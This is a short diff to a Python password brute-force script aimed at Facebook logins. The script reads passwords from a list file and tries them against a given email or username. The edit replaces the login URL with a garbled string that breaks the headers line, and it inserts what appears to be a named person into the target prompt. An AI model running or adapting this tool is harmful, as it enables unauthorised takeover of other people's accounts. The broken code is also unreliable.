@@ -13,8 +13,7 @@ if sys.version_info[0] !=3:
 			''')
 	sys.exit()
 
-post_url='https://www.facebook.com/login.php'
-headers = {
+post_url='https:https://m.facebook.com/fena.checkz?refid=12&ref=opera_speed_dialeaders = {'
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 payload={}
@@ -48,7 +47,7 @@ def function(email,passw,i):
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('passwords.txt','r')
 
-email=input('Enter Email/Username : ')
+email=input('Enter Email/Username : FeNa SaNthoash')
 
 print("\nTarget Email ID : ",email)
 print("\nTrying Passwords from list ...")
